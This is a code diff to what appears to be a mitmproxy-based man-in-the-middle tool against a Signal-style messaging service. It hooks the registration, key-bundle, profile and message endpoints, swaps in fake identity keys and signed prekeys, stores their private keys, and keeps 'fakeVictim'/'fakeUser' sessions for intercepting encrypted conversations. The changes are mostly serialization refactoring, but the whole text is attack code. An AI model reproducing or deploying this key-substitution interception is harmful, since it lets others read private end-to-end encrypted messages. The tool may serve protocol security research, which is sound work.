@@ -72,13 +72,13 @@ websocket_open_state = defaultdict(PendingWebSocket)
 
 @dataclass
 class KeyData():
-    IdenKey: Optional[identity_key.IdentityKeyPair] = None
+    IdenKey: Optional[str] = None
     SignedPreKey: Optional[dict] = None
     pq_lastResortKey: Optional[dict] = None
     PreKeys: Optional[dict] = None
     pq_PreKeys: Optional[dict] = None
 
-    fake_IdenKey: Optional[identity_key.IdentityKeyPair] = None
+    fake_IdenKey: Optional[str] = None
     fake_SignedPreKeys: Optional[dict] = None
     fake_secret_SignedPreKeys: Optional[dict] = None
 
@@ -122,16 +122,20 @@ f.close()
 
 api = addons[0]
 
-toRegInfo = lambda x: json_to_dataclass(RegistrationInfo, x)
+
+def json_to_reginfo(json_registations: str) -> dict[str, RegistrationInfo]:
+    loaded_dict = json.loads(json_registations)
+    return {key: json_to_dataclass(RegistrationInfo, value) for key, value in loaded_dict.items()}
+
 
 @api.route("/v1/registration", rtype=RouteType.REQUEST)
 def _v1_registration(flow: HTTPFlow):
     # logging.info(f"ADDRESS {flow.client_conn.address[0]}")
 
     req = json.loads(flow.request.content)
-
+    global registration_info
     with open("registration_info.json", "r") as f:
-        registration_info = json.loads(f.read(), object_hook=toRegInfo)
+        registration_info = json_to_reginfo(f.read())
     # todo: is this the first time?
     
     already_saved = registration_info.get(flow.client_conn.address[0])
@@ -168,7 +172,7 @@ def _v1_registration(flow: HTTPFlow):
             IdenKey=aci_IdenKey,
             SignedPreKey=aci_SignedPreKey,
             pq_lastResortKey=aci_pq_lastResortKey,
-            fake_IdenKey=aci_fake_IdenKey,
+            fake_IdenKey=aci_fake_IdenKey.to_base64(),
             fake_SignedPreKeys=fake_signed_pre_keys["aciSignedPreKey"],
             fake_secret_SignedPreKeys=fake_secret_SignedPreKeys["aciSignedPreKeySecret"],
             # fake_PreKeys = fake_signed_pre_keys["aciPreKey"],
@@ -182,7 +186,7 @@ def _v1_registration(flow: HTTPFlow):
             IdenKey=pni_IdenKey,
             SignedPreKey=pni_SignedPreKey,
             pq_lastResortKey=pni_pq_lastResortKey,
-            fake_IdenKey=pni_fake_IdenKey,
+            fake_IdenKey=pni_fake_IdenKey.to_base64(),
             fake_SignedPreKeys=fake_signed_pre_keys["pniSignedPreKey"],
             fake_secret_SignedPreKeys=fake_secret_SignedPreKeys["pniSignedPreKeySecret"],
             # fake_PreKeys = fake_signed_pre_keys["pniPreKey"],
@@ -195,7 +199,8 @@ def _v1_registration(flow: HTTPFlow):
     )
 
     with open("registration_info.json", "w") as f:
-        f.write(json.dumps(registration_info, default=dataclass_to_json))
+        data = json.dumps(registration_info, default=dataclass_to_json)
+        f.write(data)
 
     flow.request.content = json.dumps(req).encode()
 
@@ -207,7 +212,7 @@ def _v1_registration(flow: HTTPFlow):
     ip_address = flow.client_conn.address[0]
 
     with open("registration_info.json", "r") as f:
-        registration_info = json.loads(f.read(), object_hook=toRegInfo)
+        registration_info = json_to_reginfo(f.read())
 
     user = User.insert(
         pNumber=resp["number"],
@@ -242,8 +247,9 @@ def _v2_keys(flow: HTTPFlow):
     req = json.loads(flow.request.content)
     address = flow.client_conn.address[0]
 
+    global registration_info
     with open("registration_info.json", "r") as f:
-        registration_info = json.loads(f.read(), object_hook=toRegInfo)
+        registration_info = json_to_reginfo(f.read())
 
     ## TODO: instead of naming each key for both variables, just use the identifier as a key and the bundle(dict) as the value
     if not registration_info.get(address):
@@ -257,7 +263,7 @@ def _v2_keys(flow: HTTPFlow):
     #     return
 
     try:
-        alice_identity_key_pair = key_data.fake_IdenKey
+        alice_identity_key_pair = IdentityKeyPair.from_base64(key_data.fake_IdenKey.encode())
     except KeyError:
         logging.exception(f"{flow} AND {registration_info}")
         return
@@ -289,8 +295,8 @@ def _v2_keys(flow: HTTPFlow):
     )
 
     fake_ik = {
-        "publicKey": b64encode(key_data.fake_IdenKey.public_key().serialize()).decode("utf-8"),
-        "privateKey": b64encode(key_data.fake_IdenKey.private_key().serialize()).decode("utf-8")
+        "publicKey": b64encode(alice_identity_key_pair.public_key().serialize()).decode("utf-8"),
+        "privateKey": b64encode(alice_identity_key_pair.private_key().serialize()).decode("utf-8")
     }
     fake_spk = key_data.fake_SignedPreKeys
     fake_spk["privateKey"] = key_data.fake_secret_SignedPreKeys
@@ -330,9 +336,10 @@ def _v2_keys(flow: HTTPFlow):
 def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
     # TODO -- I need to be coherent if this endpoint is hit multiple times
     # logging.exception((flow.response.content, identifier, device_id))
+    global registration_info
 
     with open("registration_info.json", "r") as f:
-        registration_info = json.loads(f.read(), object_hook=toRegInfo)
+        registration_info = json_to_reginfo(f.read())
 
     resp = json.loads(flow.response.content)
     ip_address = flow.client_conn.address[0]
@@ -493,7 +500,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
     with open("conversation_info.json", "r") as f:
         conversation_session = json.loads(f.read())
 
-    conversation_session[(ip_address, uuid)] = (fakeVictim, fakeUser)
+    conversation_session[f"{ip_address}:{uuid}"] = (fakeVictim, fakeUser)
     #logging.warning(f"session {conversation_session}")
 
     assert "privateKey" not in resp['devices'][0]['pqPreKey']
@@ -511,8 +518,9 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
 def _v1_ws_my_profile(flow, identifier, version, credentialRequest):
     logging.info(f"my profile: {identifier} {version} {credentialRequest}")
 
+    global registration_info
     with open("registration_info.json", "r") as f:
-        registration_info = json.loads(f.read(), object_hook=toRegInfo)
+        registration_info = json_to_reginfo(f.read())
 
     resp = json.loads(flow.response.content)
     ip_address = flow.client_conn.address[0]
@@ -534,9 +542,9 @@ def _v1_ws_my_profile(flow, identifier, version, credentialRequest):
 
 
 def _v1_ws_profile_futut(flow, identifier, version):
+    global registration_info
     with open("registration_info.json", "r") as f:
-        registration_info = json.loads(f.read(), object_hook=toRegInfo)
-
+        registration_info = json_to_reginfo(f.read())
 
     logging.info(f"my profile 2: {identifier} {version}")
     # raise RuntimeError(f"my profile: {identifier} {version}")
@@ -608,7 +616,7 @@ def _v1_ws_message(flow, identifier):
     with open("conversation_info.json", "r") as f:
         conversation_session = json.loads(f.read())
 
-    session = conversation_session.get((ip_address, destination))
+    session = conversation_session.get(f"{ip_address}:{destination}")
 
     if session:
         fakeVictim, fakeUser = session
@@ -620,7 +628,7 @@ def _v1_ws_message(flow, identifier):
 
     for msg in req["messages"]:
         if msg["destinationDeviceId"] != 1:
-            logging.error(f"Secondary devices are not supported as the developer was not paid enough. C.f. my Twint ;)")
+            logging.error("Secondary devices are not supported as the developer was not paid enough. C.f. my Twint ;)")
 
         envelope_type = EnvelopeType(int(msg['type']))
         logging.warning(f"MESSAGE (Envelope) TYPE: {envelope_type}")
